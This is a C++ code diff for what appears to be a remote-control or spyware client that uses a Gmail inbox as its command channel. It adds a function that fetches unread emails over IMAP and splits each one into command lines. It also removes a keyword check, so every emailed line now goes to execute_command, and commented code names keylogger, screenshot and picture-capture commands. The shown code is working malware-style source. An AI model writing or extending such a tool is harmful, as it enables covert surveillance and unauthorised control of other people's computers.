@@ -104,9 +104,8 @@ void check_email_commands() {
       //     line.find("list_program") != string::npos ||
       //     line.find("get_picture") != string::npos ||
       //     line.find("get_screenshot") != string::npos ||
-      //     line.find("keylogger") != string::npos) 
-        execute_command(line);
-      
+      //     line.find("keylogger") != string::npos)
+      execute_command(line);
     }
   }
 
@@ -118,4 +117,79 @@ size_t WriteCallback(char* ptr, size_t size, size_t nmemb, void* userdata) {
   string* buffer = static_cast<string*>(userdata);
   buffer->append(ptr, totalSize);
   return totalSize;
+}
+
+vector<std::pair<std::string, std::string>> fetch_email_commands() {
+  std::vector<std::pair<std::string, std::string>> result;
+  CURL* curl = curl_easy_init();
+  if (!curl) {
+    std::cerr << "Failed to initialize curl" << std::endl;
+    return result;
+  }
+
+  curl_easy_setopt(curl, CURLOPT_USERNAME, gmail_username.c_str());
+  curl_easy_setopt(curl, CURLOPT_PASSWORD, app_password.c_str());
+  curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
+  curl_easy_setopt(curl, CURLOPT_CAINFO, ca_bundle_path.c_str());
+  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+
+  std::string readBuffer;
+  curl_easy_setopt(curl, CURLOPT_URL, "imaps://imap.gmail.com/INBOX");
+  curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "UID SEARCH UNSEEN");
+  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
+
+  CURLcode res = curl_easy_perform(curl);
+  if (res != CURLE_OK) {
+    std::cerr << "Error searching emails: " << curl_easy_strerror(res)
+              << std::endl;
+    curl_easy_cleanup(curl);
+    return result;
+  }
+
+  // Lấy danh sách UID
+  std::vector<std::string> ids;
+  std::regex idRegex(R"(\b\d+\b)");
+  for (std::sregex_iterator it(readBuffer.begin(), readBuffer.end(), idRegex),
+       end;
+       it != end; ++it) {
+    ids.push_back(it->str());
+  }
+
+  // Lấy nội dung từng email
+  for (const auto& id : ids) {
+    readBuffer.clear();
+    std::string fetchUrl = "imaps://imap.gmail.com/INBOX/;UID=" + id;
+    curl_easy_setopt(curl, CURLOPT_URL, fetchUrl.c_str());
+    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, nullptr);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
+
+    res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+      std::cerr << "Failed to fetch email UID " << id << ": "
+                << curl_easy_strerror(res) << std::endl;
+      continue;
+    }
+
+    // Lấy người gửi
+    std::smatch matchSender;
+    std::regex senderRe(R"(From:\s*.*<([^>]+)>)");
+    std::string senderEmail;
+    if (std::regex_search(readBuffer, matchSender, senderRe)) {
+      senderEmail = matchSender[1];
+    }
+
+    std::string decoded = extract_plain_text_from_email(readBuffer);
+    std::istringstream iss(decoded);
+    std::string line;
+    while (std::getline(iss, line)) {
+      line.erase(0, line.find_first_not_of(" \r\n"));
+      line.erase(line.find_last_not_of(" \r\n") + 1);
+      if (!line.empty()) {
+        result.emplace_back(line, senderEmail);
+      }
+    }
+  }
+
+  curl_easy_cleanup(curl);
+  return result;
 }
